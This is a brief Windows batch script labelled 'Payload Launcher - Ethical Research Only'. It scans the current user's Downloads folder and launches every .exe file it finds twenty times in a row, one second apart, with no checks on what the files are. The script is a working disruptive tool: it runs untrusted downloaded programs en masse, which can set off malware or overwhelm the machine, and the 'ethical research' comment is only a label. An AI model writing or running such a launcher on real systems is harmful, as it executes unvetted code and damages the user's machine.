@echo off
REM Payload Launcher - Ethical Research Only
set "downloads=%userprofile%\Downloads"

if not exist "%downloads%" (
    echo [ERROR] Downloads folder not found.
    exit /b
)

echo [INFO] Scanning Downloads folder for executables...
for %%f in ("%downloads%\*") do (
    if "%%~xf"==".exe" (
        echo [INFO] Executing %%~nxf 20 times...
        for /L %%i in (1,1,20) do (
            start "" "%%f"
            timeout /nobreak /t 1 >nul
        )
    )
)

echo [SUCCESS] Execution complete.
exit /b
